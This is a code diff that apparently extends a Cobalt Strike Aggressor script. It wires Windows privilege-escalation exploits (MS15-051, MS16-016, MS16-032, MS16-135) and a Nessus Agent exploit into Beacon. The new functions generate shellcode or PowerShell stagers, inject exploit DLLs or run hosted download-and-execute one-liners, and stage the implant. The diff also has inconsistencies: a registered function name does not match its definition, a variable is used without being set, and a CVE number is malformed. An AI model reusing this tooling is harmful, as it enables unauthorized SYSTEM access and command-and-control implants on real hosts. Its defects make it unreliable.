@@ -1,4 +1,105 @@
-sub nessus {
+sub ms15_051 {
+
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS15-051");
+
+	if (-is64 $1) {
+		$arch   = "x64";
+		$dll    = getFileProper(script_resource("elevate\\modules"), "cve-2015-1701.x64.dll");
+	}
+	else {
+		$arch   = "x86";
+		$dll    = getFileProper(script_resource("elevate\\modules"), "cve-2015-1701.x86.dll");
+	}
+
+	# Generate shellcode
+	$stager = shellcode($2, false, $arch);
+
+	# Spawn Beacon with DLL
+	bdllspawn!($1, $dll, $stager, "ms15-051", 5000);
+
+	# Stage
+	bstage($1, $null, $2, $arch);
+
+}
+
+sub ms16_016_exploit {
+
+	# x86 only
+	if (-is64 $1) {
+		berror($1, "MS16-016 is x86 only");
+		return;
+	}
+
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS16-016");
+
+	# Generate shellcode
+	$stager = shellcode($2, false, "x86");
+
+	$dll = getFileProper(script_resource("elevate\\modules"), "cve-2016-0051.x86.dll");
+
+	# Spawn Beacon with DLL
+	bdllspawn!($1, $dll, $stager, "ms16-016", 5000);
+
+	# stage our payload (if this is a bind payload)
+	bstage($1, $null, $2, $arch);
+
+}
+
+sub ms16_032 {
+
+	local('$script $oneliner');
+
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS16-032");
+
+	# Generate PowerShell
+	$script = artifact($2, "powershell");
+
+	# Host script
+	$oneliner = beacon_host_script($1, $script);
+
+	# Source
+	$source = getFileProper(script_resource("elevate\\modules"), "Invoke-MS16032.ps1");
+
+	# Import & run
+	bpowershell_import!($1, $source);
+	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
+
+	# Wait
+	bpause($1, 10000);
+
+	# Stage
+	bstage($1, $null, $2);
+
+}
+
+sub ms16_135 {
+
+	local('$script $oneliner');
+
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS16-135");
+
+	# Generate PowerShell
+	$script = artifact($2, "powershell");
+
+	# Host script
+	$oneliner = beacon_host_script($1, $script);
+
+	# Source
+	$source = getFileProper(script_resource("elevate\\modules"), "Invoke-MS16135.ps1");
+
+	# Import & run
+	bpowershell_import!($1, $source);
+	bpowerpick!($1, "Invoke-MS16135 -Command \" $+ $oneliner $+ \"");
+
+	# Wait
+	bpause($1, 10000);
+
+	# Stage
+	bstage($1, $null, $2);
+
+}
+
+sub nessus_agent {
 
 	$bid = $1;
 	$listener = $2;
@@ -24,4 +125,8 @@ sub nessus {
 	
 }
 
-beacon_exploit_register("nessus-agent", "Nessus Agent 6.6.2-6.10.3 (CVE-20174-7199)", &nessus);
+beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051);
+beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016);
+beacon_exploit_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032);
+beacon_exploit_register("ms16-135", "Win32k Elevation of Privilege (CVE-2016-7255)", &ms16_135);
+beacon_exploit_register("nessus-agent", "Nessus Agent 6.6.2-6.10.3 (CVE-2017-7199)", &nessus_agent);
